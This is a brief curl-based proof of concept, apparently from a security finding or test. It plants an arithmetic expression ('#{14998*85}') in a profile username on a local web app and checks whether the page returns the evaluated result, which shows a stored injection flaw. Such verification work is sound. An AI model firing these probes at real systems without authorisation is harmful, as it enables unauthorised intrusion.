poc:
TARGET_HOST="${TARGET_HOST:-127.0.0.1}"; \
  curl -sS --max-time 15 \
  --request POST \
  --path-as-is \
  --url "http://${TARGET_HOST}:3000/profile" \
  --header 'Content-Type: application/json' \
  --header 'Cookie: REDACTED' \
  --header 'Authorization: REDACTED' \
  --data-raw '{"username":"#{14998*85}"}' \
  --dump-header /tmp/jsspector-stored-poc.headers \
  --output /dev/null
JSS_COOKIE="$(sed -n 's/^[Ss]et-[Cc]ookie:[[:space:]]*\([^;]*\).*/\1/p' /tmp/jsspector-stored-poc.headers | tail -n 1)"; \
  test -n "$JSS_COOKIE";
TARGET_HOST="${TARGET_HOST:-127.0.0.1}"; \
  curl -sS --max-time 15 \
  --request GET \
  --path-as-is \
  --url "http://${TARGET_HOST}:3000/profile" \
  --header "Cookie: $JSS_COOKIE" | grep -F -m 1 -o -- '1274830'
